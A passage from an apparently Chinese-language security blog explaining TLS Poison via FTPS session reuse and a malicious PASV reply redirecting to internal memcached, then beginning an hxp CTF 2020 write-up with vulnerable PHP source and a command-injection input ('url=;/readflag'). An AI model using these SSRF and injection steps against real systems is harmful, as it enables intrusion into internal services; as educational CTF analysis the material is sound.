aqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://miro.medium.com/max/1926/1*yyyR4y2MDi3O7_NeUmiGjw.png" alt=""></p><p>所以在被动模式中，我们可以借由上图清楚的明白，在数据传输阶段，客户端需要与服务端重新建立一次连接！而在显式 FTPS 当中，重新建立连接就可以重新使用 TLS 会话，也就意味着可能被 TLS Poison 攻击！</p><h3 id="Implicit"><a href="#Implicit" class="headerlink" title="Implicit"></a>Implicit</h3><p>对于隐式模式，因为一开始就需要建立 TLS 会话，所以即使没有 RFC 规定，理论上也很明显应该也同样会支持 TLS 会话重用的机制。</p><p>这里我们可以使用 vsftpd 来进行简单实验，安装 vsftpd 后在 /etc/vsftp.conf 中开启<code>implicit_ssl=YES</code>选项</p><p>参考配置：</p><p></p><figure class="highlight ini hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">listen</span>=<span class="hljs-literal">NO</span></span><br><span class="line"><span class="hljs-attr">listen_ipv6</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">anonymous_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">local_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">write_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">local_umask</span>=<span class="hljs-number">022</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">anon_root</span>=/var/ftp/</span><br><span class="line"><span class="hljs-attr">no_anon_password</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">hide_ids</span>=<span class="hljs-literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">dirmessage_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">use_localtime</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">xferlog_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">connect_from_port_20</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">secure_chroot_dir</span>=/var/run/vsftpd/empty</span><br><span class="line"><span class="hljs-attr">pam_service_name</span>=vsftpd</span><br><span class="line"><span class="hljs-attr">pasv_enable</span>=<span class="hljs-literal">Yes</span></span><br><span class="line"><span class="hljs-attr">pasv_min_port</span>=<span class="hljs-number">10000</span></span><br><span class="line"><span class="hljs-attr">pasv_max_port</span>=<span class="hljs-number">11000</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">rsa_cert_file</span>=/home/ubuntu/tls/fullchain.pem</span><br><span class="line"><span class="hljs-attr">rsa_private_key_file</span>=/home/ubuntu/tls/privkey.pem</span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">ssl_enable</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">ssl_ciphers</span>=HIGH</span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">allow_anon_ssl</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">force_local_data_ssl</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">force_local_logins_ssl</span>=<span class="hljs-literal">YES</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">ssl_tlsv1</span>=<span class="hljs-literal">YES</span></span><br><span class="line"><span class="hljs-attr">ssl_sslv2</span>=<span class="hljs-literal">NO</span></span><br><span class="line"><span class="hljs-attr">ssl_sslv3</span>=<span class="hljs-literal">NO</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-attr">listen_port</span>=<span class="hljs-number">11211</span></span><br><span class="line"><span class="hljs-attr">implicit_ssl</span>=<span class="hljs-literal">YES</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>请按照其他教程申请对应域名证书、配置好匿名 ssl 访问 vsftpd ，否则很容易导致 vsftpd 报错，并且检查好 vsftpd 状态是否成功运行。</p><p>配置好 vsftpd 后使用 curl 进行访问:</p><p></p><figure class="highlight groovy hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="hljs-string">ftps:</span><span class="hljs-comment">//exmaple.com -v</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>这里我另外增加了<code>--tls-max 1.2</code>选项，因为在 TLS 1.3 当中， Session ID 传输在加密过程中，不便观察，而 TLS 1.2 可以在 Server Hello 消息中看到 TLS Server 设置的 Session ID，所以这里我们使用<code>--tls-max 1.2</code>迫使 curl 最大使用 TLS 1.2 版本。</p><p>我们就可以观察到如下图所示现象：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510123202.png" alt=""></p><p>可以看到也是在使用<code>PASV</code>命令之后，也就是数据传输阶段时，重新使用了 Session ID 进行建立 TLS 会话。</p><h3 id="PASV"><a href="#PASV" class="headerlink" title="PASV"></a>PASV</h3><p>既然确定了可以重用 TLS 会话，那么接下来的一个问题就是 DNS Rebinding 的问题，也是 TLS Poison 攻击中的关键问题。</p><p>但是众所周知，特别是在过去的一年当中，FTP 在 CTF 中的利用出现得也算比较多的了，利用主动、被动模式进行 SSRF 也不并不是新鲜的 Trick 了，所以在这里我们还可以 FTPS 服务端向客户端默认发送的<code>PASV</code>命令给予恶意回复为<code>227 Entering Passive Mode (127,0,0,1,43,203)</code>，就可以得到一个简单的 “DNS Rebinding” 效果了。</p><p>但是众所周知，这种小 Trick 应该被视为一种漏洞，因为在设计之初，本来就应该将 FTP 客户端、服务端进行绑定，也就是说，无论 FTP 使用被动还是主动模式，都应该是服务端与客户端之间进行建立控制流与数据流，并不应该与第三者进行，况且如果攻击者恶意将数据流定向到内网端口就极易产生 SSRF 。</p><p>所以，Firefox 早在 2007 年就修复了 FTP 带来的这个问题，并分配了 CVE 编号：CVE-2007-1562 ，而 curl 迟迟在 2020 年才被发现这类问题并修复，也分配了 CVE 编号：CVE-2020-8284。curl 版本在 4.0 与 7.73.0 之间都会受到该种漏洞的影响，详见：<a href="https://curl.se/docs/CVE-2020-8284.html" target="_blank" rel="noopener">trusting FTP PASV responses</a></p><p>所以对于 FTPS 来说，只要存在<code>PASV</code>这个漏洞，就可以非常方便地使用 TLS Poison 进行攻击。具体步骤为：</p><ol><li>curl 访问 ftps 服务器，并与其建立 tls 握手</li><li>ftps 服务器在建立 tls 连接时设置恶意 session id</li><li>ftps 对于 curl 发出的<code>pasv</code>命令返回<code>(127,0,0,1,43,203)</code>，并等待接下来的<code>LIST</code>等命令</li><li>之后 curl 才会与 127.0.0.1:11211 尝试重用 session id 建立 TLS 会话</li></ol><p>好了，熟悉了 TLS Poison 攻击以及确定 FTPS 两个形式都可能受到 TLS Poison 攻击，那接下来我们就来亲自体验一下在 CTF 当中的应用吧。</p><h2 id="HXP-CTF-Security-Scanner"><a href="#HXP-CTF-Security-Scanner" class="headerlink" title="HXP CTF - Security Scanner"></a>HXP CTF - Security Scanner</h2><p>这是来自 2020 年 hxp CTF 当中的一道 web 方向题目，到 hxp 比赛结束只有两解，算是一道比较难的题目。这个题目其实我很早就做复盘的一个题，利用了今年 DEF CON 等 web 的时间把这个题做了一次简单的复盘。</p><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote><p>​    Finally, after all these years computers are stealing my job.</p><p>Try our new robotic security scanner.</p></blockquote><p>Author: <a href="https://bierbaumer.net/" target="_blank" rel="noopener">0xbb</a> </p><p>主要题目源码：</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">'sandbox'</span>])) {</span><br><span class="line">    $id = <span class="hljs-string">''</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span>(strlen($id) &lt; <span class="hljs-number">10</span>) {</span><br><span class="line">        $b = random_bytes(<span class="hljs-number">1</span>);</span><br><span class="line">        <span class="hljs-keyword">if</span>(ord($b) &gt; <span class="hljs-number">32</span> &amp;&amp; ord($b) != <span class="hljs-number">0x7f</span>) {</span><br><span class="line">            $id .= $b;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    $_SESSION[<span class="hljs-string">'sandbox'</span>] = $id;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h1&gt;Sandbox&lt;/h1&gt;'</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;code&gt;'</span>.base64_encode($_SESSION[<span class="hljs-string">'sandbox'</span>]).<span class="hljs-string">'&lt;/code&gt;'</span>;  </span><br><span class="line"></span><br><span class="line">$m = <span class="hljs-keyword">new</span> Memcached();</span><br><span class="line">$m-&gt;addServer(<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">11211</span>);</span><br><span class="line"></span><br><span class="line">$url = strval($_GET[<span class="hljs-string">'url'</span>]);</span><br><span class="line"><span class="hljs-keyword">if</span> ($m-&gt;get($_SESSION[<span class="hljs-string">'sandbox'</span>].$url) !== <span class="hljs-string">'OK'</span>) {</span><br><span class="line">    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/^[0-9a-zA-Z:\.\/-]{1,64}$/'</span>, $url) !== <span class="hljs-number">1</span>) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">'security :('</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $git_check = <span class="hljs-string">"001e# service=git-upload-pack\n"</span>;</span><br><span class="line">    $data = file_get_contents($url .<span class="hljs-string">'/info/refs?service=git-upload-pack'</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ($data  === <span class="hljs-keyword">FALSE</span> || substr($data, <span class="hljs-number">0</span>, strlen($git_check)) !== $git_check) {</span><br><span class="line">        <span class="hljs-keyword">die</span>(<span class="hljs-string">"doesn't look like git :("</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $m-&gt;set($_SESSION[<span class="hljs-string">'sandbox'</span>].$url, <span class="hljs-string">'OK'</span>, time() + <span class="hljs-number">300</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$output = [];</span><br><span class="line">$return_var = <span class="hljs-number">1</span>;</span><br><span class="line">exec(<span class="hljs-string">"timeout -s KILL 3 git ls-remote --tags -- $url"</span>, $output, $return_var);</span><br><span class="line"><span class="hljs-keyword">if</span>($return_var !== <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-keyword">die</span>(<span class="hljs-string">'analysis failed :('</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h1&gt;Analysis&lt;/h1&gt;'</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">"URL: ${url}"</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h2&gt;Tags&lt;/h2&gt;'</span>;</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;ul&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">foreach</span>($output <span class="hljs-keyword">as</span> $l) {</span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;li&gt;&lt;code&gt;${l}&lt;/code&gt;&lt;/li&gt;"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;/ul&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;h2&gt;Result&lt;/h2&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">TRUE</span>) { <span class="hljs-comment">// patented algorithm (tm)</span></span><br><span class="line">    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Likely insecure :('</span>; </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><p>审计代码，我们可以总结出代码执行的主要流程如下：</p><ul><li>生成随机字符串做 SANDBOX</li><li>用户输入 url 后，从 Memecached 中获取键值为 SANDBOX + url 的 Value 值，判断是否为 “OK”<ul><li>如果不是，通过<code>^[0-9a-zA-Z:\.\/-]{1,64}$</code>正则后，通过<code>file_get_contents</code>访问<code>$url .'/info/refs?service=git-upload-pack'</code>，检查结果是否以<code>001e# service=git-upload-pack\n</code>开头<ul><li>如果不是以<code>001e# service=git-upload-pack\n</code>开头，则结束程序</li><li>如果是，则会在 Memecached 中将键值为 SANDBOX + url 的 Value 值设置为 “OK”，时间为 5min</li></ul></li><li>如果是 “OK” ，则会使用<code>exec</code>执行命令<code>timeout -s KILL 3 git ls-remote --tags -- $url</code>，如果访问成功则输出响应</li></ul></li></ul><p>整个代码流程如下图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/good_workflow.png" alt=""></p><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution 1"></a>Solution 1</h3><p>From: <a href="https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner" target="_blank" rel="noopener">https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner</a></p><p>我们先来看看第一种解法，这也是 perfect guesser 他们使用的类似解法，通过 HTTPS 来进行解题。</p><p>题目唯一一处可以让我们直接执行命令的地方就是<code>exec</code>处了，所以如果没有其他校验验证的话，我们可以直接使用命令注入进行 RCE ，例如传入<code>url=;/readflag</code>，这样题目执行顺序如下流程图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/dfyz/ctf-writeups@master/hxp-2020/security%20scanner/bad_workflow.png" alt=""></p><p>这样题目在执行我们的命令时，就也会把回显显示给我们了，也就拿到 FLAG 